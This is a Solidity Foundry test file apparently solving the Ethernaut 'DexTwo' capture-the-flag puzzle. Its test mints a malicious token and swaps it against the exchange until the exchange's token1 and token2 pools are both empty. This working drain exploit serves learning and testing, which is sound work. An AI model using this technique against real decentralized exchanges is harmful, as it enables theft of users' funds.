// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {DexTwoSolution} from "@script/23/DexTwoSolution.s.sol";
import {DeployDexTwoAttacker} from "@script/23/DeployDexTwoAttacker.s.sol";
import {DexTwo, SwappableTokenTwo} from "@puzzles/23/DexTwo.sol";
import {MalToken} from "@attackers/23/MalToken.sol";
import {SwappableToken} from "@puzzles/22/Dex.sol";

contract DexTwoTest is Test {
    DexTwo internal dex;
    SwappableTokenTwo internal token1;
    SwappableTokenTwo internal token2;
    MalToken internal malToken;

    address owner = makeAddr("owner");
    address player = msg.sender;

    uint256 constant INITIAL_SUPPLY = 110;
    uint256 constant INITIAL_POOL_BALANCE = 100;
    uint256 constant INITIAL_USER_BALANCE = 10;

    function setUp() public {
        vm.startPrank(owner);
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(address(dex), "Token1", "T1", INITIAL_SUPPLY);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "T2", INITIAL_SUPPLY);
        dex.setTokens(address(token1), address(token2));
        token1.transfer(address(dex), INITIAL_POOL_BALANCE);
        token2.transfer(address(dex), INITIAL_POOL_BALANCE);
        token1.transfer(player, INITIAL_USER_BALANCE);
        token2.transfer(player, INITIAL_USER_BALANCE);
        vm.stopPrank();

        malToken = new DeployDexTwoAttacker().run();
    }

    function testDexTwo() public {
        vm.startPrank(player);
        // get all token1 from dex
        malToken.mintTokensToAddress(player, 3);

        malToken.mintTokensToAddress(address(dex), 1);
        malToken.approve(address(dex), 1);
        dex.swap(address(malToken), address(token1), 1);
        assertEq(token1.balanceOf(address(dex)), 0);

        // get all token2 from dex
        malToken.mintTokensToAddress(player, 2);
        malToken.approve(address(dex), 2);
        dex.swap(address(malToken), address(token2), 2);
        assertEq(token2.balanceOf(address(dex)), 0);

        vm.stopPrank();
    }

    function testDexTwoSolution() public {
        DexTwoSolution solution = new DexTwoSolution();
        solution.solve(address(dex), address(malToken), player);
        assertEq(token1.balanceOf(address(dex)), 0);
        assertEq(token2.balanceOf(address(dex)), 0);
    }
}